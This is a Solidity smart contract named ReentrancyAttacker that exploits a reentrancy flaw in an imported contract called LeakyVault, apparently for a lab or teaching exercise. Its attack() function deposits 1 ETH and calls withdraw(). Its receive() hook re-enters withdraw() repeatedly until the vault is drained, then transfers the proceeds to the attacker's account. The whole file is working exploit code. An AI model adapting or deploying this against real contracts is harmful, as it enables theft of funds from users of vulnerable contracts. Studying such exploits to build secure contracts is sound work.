// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {LeakyVault} from "./LeakyVault.sol";

contract ReentrancyAttacker {
    LeakyVault public vault;
    address public owner;
    uint256 public attackCount;

    constructor(LeakyVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    /// Start the attack by depositing 1 ETH and calling withdraw() once.
    function attack() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value >= 1 ether, "need at least 1 ETH");

        // Deposit 1 ETH into the vault under this contract's address
        vault.deposit{value: 1 ether}();

        // Trigger the first withdraw, which will call our receive() and reenter
        vault.withdraw();
    }

    // Called by the vault when it sends ETH to us.
    receive() external payable {
        attackCount++;

        // As long as the vault still has >= 1 ETH, keep reentering withdraw()
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        } else {
            // When drained, send everything to the EOA attacker
            payable(owner).transfer(address(this).balance);
        }
    }
}